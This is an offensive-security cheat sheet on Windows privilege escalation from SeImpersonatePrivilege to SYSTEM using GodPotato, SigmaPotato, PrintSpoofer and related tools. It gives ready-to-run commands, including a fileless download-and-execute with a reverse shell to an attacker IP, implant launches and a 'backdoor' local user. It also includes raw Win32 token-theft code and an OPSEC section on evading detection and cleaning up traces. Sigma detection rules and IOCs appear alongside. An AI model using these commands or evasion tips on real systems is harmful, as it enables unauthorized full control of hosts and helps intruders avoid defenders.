# Token Impersonation — The Potato Family (SeImpersonatePrivilege → SYSTEM)

ATT&CK: T1134.001 (Token Impersonation/Theft), T1134.002 (Create Process with Token),
T1134.003 (Make and Impersonate Token). CWE-269 (Improper Privilege Management),
CWE-250 (Execution with Unnecessary Privileges).

## Theory / Mechanism

Windows tokens come in two flavours: **primary** (a process's identity) and **impersonation**
(a thread temporarily acting as another identity). Impersonation has four levels —
Anonymous < Identification < **Impersonation** < **Delegation**. You need Impersonation or
Delegation level to actually *use* a captured token to launch a process.

`SeImpersonatePrivilege` (held by default by service accounts: IIS `APPPOOL`, MSSQL `sqlservr`,
many scheduled-task service accounts, Local/Network Service) lets a thread impersonate any token
it can obtain. The entire **Potato** family weaponizes this: trick a *privileged* Windows service
(running as SYSTEM) into authenticating to a listener you control, capture the resulting SYSTEM
token via local NTLM/DCOM, then `CreateProcessWithTokenW` / `CreateProcessAsUserW` to spawn a
SYSTEM process. High integrity is **not** required — only the privilege.

Different Potatoes coerce SYSTEM through different RPC/COM surfaces; which one fires depends on OS
build, installed .NET runtime, patch level, and what RPC/COM endpoints are still reachable.

## Modern 2024-2026 variant matrix (verified)

| Variant | Coercion surface | Coverage | When to use |
|---------|------------------|----------|-------------|
| **GodPotato** | DCOM/OXID resolver (local) | Server 2012–2022, Win8–11; **no outbound** | Default modern choice; pick the `-NET2/-NET35/-NET4` exe matching installed .NET |
| **SigmaPotato** | GodPotato fork + .NET reflection | Win8–11, Server 2012–2022 | Fileless (load-from-memory), built-in `--revshell`, bypasses 1024-char cmd limit |
| **PrintNotifyPotato** | PrintNotify/Print Workflow COM | Win10/11, Server 2012–2022 | Pure COM, no RPC redirector → drop-in when Defender blocks RoguePotato's RPC bind; survives PrintNightmare hardening |
| **DCOMPotato** | Service DCOM @ RPC_C_IMP_LEVEL_IMPERSONATE | incl. Server 2022 | `PrinterNotifyPotato.exe` / `McpManagementPotato.exe` variants |
| **EfsPotato / SharpEfsPotato** | MS-EFSR (EFS RPC) | broad | When EFSRPC pipe reachable; C# in-memory variant |
| **RoguePotato** | OXID resolver via external redirector (port 135) | Server 2019 | Needs outbound 135 to attacker redirector |
| **PrintSpoofer** | Spooler named pipe (MS-RPRN) | Win10/Server 2016–2019 | Classic; broken where Spooler disabled |
| **JuicyPotatoNG** | DCOM CLSID, local | ≤ Server 2016 mostly | Legacy; try when newer ones fail |

- **DeadPotato** = GodPotato chain + baked-in post-ex helpers (noisier; higher AV flags).
- **Server 2025**: no dedicated public variant confirmed yet, but the DCOM/COM architecture is shared
  with 2022 — GodPotato/SigmaPotato/PrintNotifyPotato typically still fire; verify on a live target.
- **Stripped token?** Local/Network Service shells often show a *filtered* token without
  `SeImpersonatePrivilege`. Recover the account's default privilege set with **FullPowers**, then
  run the Potato.
- Real-world: operators (e.g. Ink Dragon) fire **PrintNotifyPotato** right after ViewState/SharePoint
  RCE to pivot `w3wp.exe` → SYSTEM before deploying implants.

## Complete working commands

```powershell
# 0. Confirm the privilege
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"

# 1. Recover a stripped token if needed (Local/Network Service)
.\FullPowers.exe -c "C:\Windows\Tasks\GodPotato-NET4.exe -cmd cmd" -z

# 2a. GodPotato — match the .NET runtime on the host
.\GodPotato-NET4.exe -cmd "cmd /c whoami"               # verify SYSTEM
.\GodPotato-NET4.exe -cmd "C:\Windows\Tasks\beacon.exe" # launch implant

# 2b. SigmaPotato — fileless via .NET reflection
powershell -c "$b=(New-Object Net.WebClient).DownloadData('http://10.10.14.5/SigmaPotato.exe'); \
  [Reflection.Assembly]::Load($b); [SigmaPotato]::Main(@('--revshell','10.10.14.5','443'))"
.\SigmaPotato.exe "net user backdoor P@ssw0rd! /add"
.\SigmaPotato.exe --revshell 10.10.14.5 443

# 2c. PrintNotifyPotato — pure COM, Defender-resilient
.\PrintNotifyPotato.exe "cmd /c C:\Windows\Tasks\beacon.exe"

# 2d. DCOMPotato variants
.\PrinterNotifyPotato.exe "cmd /c whoami"
.\McpManagementPotato.exe "cmd /c whoami"               # works on Server 2022

# 2e. EfsPotato (C#) when EFSRPC reachable
.\SharpEfsPotato.exe -p C:\Windows\Tasks\beacon.exe

# 2f. PrintSpoofer (legacy Spooler path)
.\PrintSpoofer64.exe -i -c "cmd"
```

`scripts/check_potato.py` parses `whoami /priv` + an OS/build string and recommends which Potato to
try first (and whether FullPowers is needed), encoding the matrix above.

## Named-pipe / token primitives (build-your-own)

When you'd rather not drop a known hacktool, the same primitives in raw Win32:

```c
// 1) Coerce a privileged client to your named pipe, then impersonate it.
HANDLE hPipe = CreateNamedPipeA("\\\\.\\pipe\\evil", PIPE_ACCESS_DUPLEX,
    PIPE_TYPE_MESSAGE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
ConnectNamedPipe(hPipe, NULL);          // wait for SYSTEM service to connect
ImpersonateNamedPipeClient(hPipe);      // thread now runs as the client (SYSTEM)

// 2) Steal & duplicate a token from a SYSTEM process (needs SeDebugPrivilege).
HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid), hTok, hDup;
OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, 0, L"C:\\Windows\\System32\\cmd.exe",
                        NULL, 0, NULL, NULL, &si, &pi);   // SYSTEM cmd
```

## Detection

```yaml
title: Potato-style SeImpersonate Abuse - SYSTEM Child of Service Worker
logsource: { product: windows, category: process_creation }
detection:
  parent:
    ParentImage|endswith: ['\w3wp.exe','\sqlservr.exe','\svchost.exe','\dllhost.exe','\php-cgi.exe']
  child:
    User|contains: ['SYSTEM','AUTORITE NT']
    Image|endswith: ['\cmd.exe','\powershell.exe','\rundll32.exe']
  tools:
    Image|endswith: ['\GodPotato','Potato.exe','\PrintSpoofer','\SharpEfsPotato.exe','\SigmaPotato.exe']
  condition: (parent and child) or tools
level: high
---
title: FullPowers Token Privilege Recovery
logsource: { product: windows, category: process_creation }
detection:
  sel: { Image|endswith: '\FullPowers.exe' }
  alt: { ParentImage|endswith: '\TrustedInstaller.exe', User|contains: ['NETWORK SERVICE','LOCAL SERVICE'] }
  condition: sel or alt
level: medium
```
IOCs: SYSTEM-integrity `cmd/powershell` whose parent is a service worker (`w3wp`,`sqlservr`);
4674 "operation on privileged object" bursts; named pipe `\\.\pipe\` create followed immediately by
`ImpersonateNamedPipeClient`; 4624/4648 local NTLM logon to self; DCOM/OXID RPC to 127.0.0.1.

## OPSEC

- The SYSTEM-child-of-service-worker process tree is the single biggest tell. Spawn your implant
  with a benign-looking parent or migrate immediately; avoid `cmd.exe /c whoami` as the elevated cmd.
- Prefer `SigmaPotato` reflection (no binary on disk) or `PrintNotifyPotato` (no RPC redirector that
  Defender's network signatures catch). `RoguePotato` needs outbound 135 → blocked/loud on many nets.
- Try-and-iterate: a failed Potato is comparatively quiet, but each attempt spawns the tell-tale tree.
  Use `check_potato.py` to minimize wrong attempts.
- Clean up: remove any dropped `*Potato*.exe`, kill orphaned pipe servers, delete added local users.

## References
- BeichenDream/GodPotato; tylerdotrar/SigmaPotato; itm4n/PrintSpoofer & FullPowers
- antonioCoco/JuicyPotatoNG & RoguePotato; zcgonvh/EfsPotato; bugch3ck/PrintNotifyPotato; DCOMPotato
- HackTricks — "RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato" and "Abusing Tokens" (2025)
- bytejmp.com — "The Potato Family — Windows Privilege Escalation (2016–2024)"
